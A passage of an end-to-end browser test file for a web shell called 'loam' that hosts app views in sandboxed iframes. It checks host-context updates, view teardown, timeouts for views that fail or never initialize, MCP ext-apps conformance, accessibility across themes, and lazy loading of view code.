			'dev.loam/scope': { workspace: string; project?: string };
			'dev.loam/route': string;
		};
		expect(context.platform).toBe('web');
		// Phase 2's step 6: the surface's scope and the app's route (7.6).
		expect(context['dev.loam/scope']).toEqual({ workspace: 'personal' });
		expect(context['dev.loam/route']).toBe('');
		expect(context.displayMode).toBe('inline');
		expect(context.containerDimensions.width).toBeGreaterThan(0);
		expect(context.containerDimensions.height).toBeGreaterThan(0);
		expect(Object.keys(context['dev.loam/tokens']).length).toBe(108);
		expect(context['dev.loam/tokens']['--color-surface-page']).not.toBe('');
		expect(
			Object.keys(context['dev.loam/tokens']).some((name) => name.startsWith('--shell-'))
		).toBe(false);
		expect(parsed).not.toHaveProperty('hostContext.styles');

		const changes = () =>
			inner.evaluate(() =>
				(
					window as unknown as {
						messages: Array<{ method: string; params: Record<string, unknown> }>;
					}
				).messages
					.filter(({ method }) => method === 'ui/notifications/host-context-changed')
					.map(({ params }) => params)
			);
		await page.setViewportSize({ width: 1100, height: 700 });
		await expect
			.poll(async () => (await changes()).some((change) => 'containerDimensions' in change))
			.toBe(true);
		await agentCall(page, 'appearance-set', { theme: 'dark' });
		await expect
			.poll(async () => (await changes()).filter((change) => change.theme === 'dark').length)
			.toBe(1);
		// A change of route is a property change, told to the same view, which stays (7.6).
		await agentCall(page, 'app-route-set', { instance: 'fixture', path: 'items/one' });
		await expect
			.poll(async () =>
				(await changes()).some((change) => change['dev.loam/route'] === 'items/one')
			)
			.toBe(true);
		expect(
			await inner.evaluate(() => (window as unknown as { initialize: unknown }).initialize)
		).toEqual(result);
		await opened.context.close();
	});
});

describe('P2-E13: E2: leaving a view', () => {
	it('sends teardown on a switch, and removes the frame', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		const heard: string[] = [];
		page.on('console', (message) => {
			if (message.text() === 'fixture: teardown') heard.push(message.text());
		});
		await openApp(page, 'fixture');
		await viewFrames(page);
		await page.locator('loam-rail loam-app-entry[instance="tally"] button').click();
		await page.locator('tally-main').waitFor();
		await expect.poll(() => heard).toEqual(['fixture: teardown']);
		await expect.poll(() => page.locator('loam-view-frame').count()).toBe(0);
		// The handler frame stays: commands work with the view closed.
		expect(await page.locator('body > iframe').count()).toBe(1);
		expect(opened.errors).toEqual([]);
		await opened.context.close();
	});

	it('removes a frame at 500 ms that does not answer, and at once before initialized', async () => {
		const silent = await serveDeployment({
			sandbox: true,
			config: deploymentFile(
				deploymentEntry(
					'fixture',
					await viewPackage(
						'silent',
						recordingView(0).replace(
							"if (message.id !== undefined) parent.postMessage({ jsonrpc: '2.0', id: message.id, result: {} }, '*');",
							''
						)
					)
				),
				deploymentEntry('tally', await packApp('tally'))
			),
		});
		const opened = await openShell(browser, silent.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		await openApp(page, 'tally');
		await expect.poll(() => page.locator('loam-view-frame').count(), { timeout: 2_000 }).toBe(0);
		await opened.context.close();
		await silent.close();

		const uninitialized = await serveDeployment({
			sandbox: true,
			config: deploymentFile(
				deploymentEntry('fixture', await viewPackage('uninitialized', recordingView('never'))),
				deploymentEntry('tally', await packApp('tally'))
			),
		});
		const early = await openShell(browser, uninitialized.origin);
		await early.page.locator('loam-rail loam-app-entry[instance="fixture"] button').click();
		await early.page.locator('loam-view-frame iframe').waitFor({ state: 'attached' });
		await viewFrames(early.page);
		await early.page.locator('loam-rail loam-app-entry[instance="tally"] button').click();
		await early.page.locator('tally-main').waitFor();
		expect(await early.page.locator('loam-view-frame').count()).toBe(0);
		await early.context.close();
		await uninitialized.close();
	});
});

describe('P2-E13: E2: a view that fails', () => {
	it('shows VIEW_RESOURCE_UNAVAILABLE in main, and the rest of the shell works', async () => {
		const missing = await serveDeployment({
			sandbox: true,
			config: deploymentFile(
				deploymentEntry('fixture', await viewPackage('missing', null)),
				deploymentEntry('tally', await packApp('tally'))
			),
		});
		const opened = await openShell(browser, missing.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const notice = page.locator('loam-view-frame loam-notice');
		await notice.waitFor();
		expect(await notice.locator('p').first().textContent()).toContain('VIEW_RESOURCE_UNAVAILABLE');
		expect(await page.locator('loam-view-frame iframe').count()).toBe(0);
		await openApp(page, 'tally');
		await page.locator('tally-main').waitFor();
		await opened.context.close();
		await missing.close();
	});

	it('removes a view with no initialized after 15 seconds, with VIEW_READY_TIMEOUT', async () => {
		const stuck = await serveDeployment({
			sandbox: true,
			config: deploymentFile(
				deploymentEntry('fixture', await viewPackage('stuck', recordingView('never')))
			),
		});
		const opened = await openShell(browser, stuck.origin);
		const { page } = opened;
		await page.locator('loam-rail loam-app-entry[instance="fixture"] button').click();
		await page.locator('loam-view-frame iframe').waitFor({ state: 'attached' });
		expect(await page.locator('loam-view-frame .loading').textContent()).toContain(
			'Opening Fixture'
		);
		await page.locator('loam-view-frame loam-notice').waitFor({ timeout: 20_000 });
		expect(await page.locator('loam-view-frame loam-notice p').first().textContent()).toContain(
			'VIEW_READY_TIMEOUT'
		);
		expect(await page.locator('loam-view-frame iframe').count()).toBe(0);
		await expect.poll(() => page.locator('loam-main').getAttribute('aria-busy')).toBeNull();
		await opened.context.close();
		await stuck.close();
	}, 40_000);
});

describe('P2-E13: E2: conformance with @modelcontextprotocol/ext-apps', () => {
	it('connects, reads its host context, calls a tool and receives teardown', async () => {
		const main = `<!doctype html><html lang="en"><head><meta charset="utf-8" /><title>Conformance</title></head><body><main><h1>Conformance</h1></main>${inlineScript(await bundlePage('ext-apps-view'))}</body></html>`;
		const conformance = await serveDeployment({
			sandbox: true,
			config: deploymentFile(
				deploymentEntry('fixture', await viewPackage('conformance', main)),
				deploymentEntry('tally', await packApp('tally'))
			),
		});
		const opened = await openShell(browser, conformance.origin);
		const { page } = opened;
		const heard: string[] = [];
		page.on('console', (message) => heard.push(message.text()));
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		await inner.waitForFunction(() => {
			const state = (window as unknown as { conformance: { connected?: boolean; failed?: string } })
				.conformance;
			return state.connected === true || state.failed !== undefined;
		});
		const state = await inner.evaluate(
			() =>
				(
					window as unknown as {
						conformance: {
							failed?: string;
							hostContext: { theme: string; 'dev.loam/tokens': Record<string, string> };
							hostCapabilities: Record<string, unknown>;
							called: { isError?: boolean; structuredContent: { data: unknown } };
							toolResult?: { structuredContent: { data: unknown } };
						};
					}
				).conformance
		);
		expect(state.failed).toBeUndefined();
		expect(['light', 'dark']).toContain(state.hostContext.theme);
		expect(state.hostContext['dev.loam/tokens']['--color-surface-page']).not.toBe('');
		expect(state.hostCapabilities).toHaveProperty('serverTools');
		expect(state.called.isError).toBe(false);
		expect(state.called.structuredContent.data).toEqual({ answered: true });
		await expect
			.poll(() =>
				inner.evaluate(
					() =>
						(window as unknown as { conformance: { toolResult?: unknown } }).conformance
							.toolResult !== undefined
				)
			)
			.toBe(true);

		await page.locator('loam-rail loam-app-entry[instance="tally"] button').click();
		await page.locator('tally-main').waitFor();
		await expect.poll(() => heard).toContain('conformance: teardown');
		await expect.poll(() => page.locator('loam-view-frame').count()).toBe(0);
		expect(opened.violations).toEqual([]);
		expect(opened.errors).toEqual([]);
		await opened.context.close();
		await conformance.close();
	}, 60_000);
});

/**
 * Axe runs per document here, and the page's `h1` is in the view's document (9.3), which the frame's own
 * run checks. Around it, every other rule runs.
 */
const AROUND_THE_FRAME = ['page-has-heading-one'];

describe('P2-E13: E2: accessibility', () => {
	for (const theme of ['light', 'dark', 'high-contrast'] as const)
		for (const density of ['comfortable', 'compact'] as const)
			it(`passes axe inside the frame and around it in ${theme}, ${density}`, async () => {
				const opened = await openShell(browser, site.origin, {
					viewport: { width: 1600, height: 900 },
					reducedMotion: 'reduce',
				});
				const { page } = opened;
				await agentCall(page, 'appearance-set', { theme, density });
				await openApp(page, 'hello');
				const { inner } = await viewFrames(page);
				await agentCall(page, 'hello-greet', { name: 'Ada' });
				await expect.poll(() => inner.locator('#greeting').textContent()).toBe('Hello, Ada!');
				await surfacesIdle(page);
				expect(await axe(inner)).toEqual([]);
				expect(await axe(page, AROUND_THE_FRAME)).toEqual([]);
				expect(opened.violations).toEqual([]);
				await opened.context.close();
			});

	it('passes axe inside the frame under forced colors', async () => {
		const opened = await openShell(browser, site.origin, { forcedColors: 'active' });
		const { page } = opened;
		await openApp(page, 'hello');
		const { inner } = await viewFrames(page);
		expect(await axe(inner)).toEqual([]);
		expect(await axe(page, AROUND_THE_FRAME)).toEqual([]);
		await opened.context.close();
	});

	it('reaches the view by keyboard from the shell', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'hello');
		const { inner } = await viewFrames(page);
		await page.locator('loam-view-frame iframe').focus();
		await page.keyboard.press('Tab');
		await expect
			.poll(() =>
				inner.evaluate(() => document.activeElement?.id ?? document.activeElement?.tagName)
			)
			.toBe('name');
		await opened.context.close();
	});
});

describe('First paint with this step', () => {
	it('loads nothing of a view for a native-only deployment or an empty shell', async () => {
		const native = await serveDeployment({
			config: deploymentFile(
				deploymentEntry('hello', await packApp('hello')),
				deploymentEntry('tally', await packApp('tally'))
			),
		});
		const opened = await openShell(browser, native.origin);
		await openApp(opened.page, 'hello');
		await agentCall(opened.page, 'hello-greet', { name: 'Ada' });
		await kernelCall(opened.page, 'hello-list');
		const paths = native.log.map(({ path }) => path);
		expect(paths.filter((path) => /\/assets\/view-|\/sandbox\//.test(path))).toEqual([]);
		expect(await opened.page.locator('iframe').count()).toBe(0);
		await opened.context.close();
		await native.close();

		const empty = await serveDist();
		const shell = await openShell(browser, empty.origin);
		const emptyPaths = empty.log.map(({ path }) => path);
		expect(emptyPaths.filter((path) => /\/assets\/view-|\/sandbox\//.test(path))).toEqual([]);
		await shell.context.close();
		await empty.close();
	});

	it('loads the view chunk for a view app only when it is opened or called', async () => {
		const opened = await openShell(browser, site.origin);
		const viewChunks = () => site.log.filter(({ path }) => /\/assets\/view-/.test(path)).length;
		const before = viewChunks();
		await surfacesIdle(opened.page);
		expect(viewChunks()).toBe(before);
		await opened.context.close();
	});
});
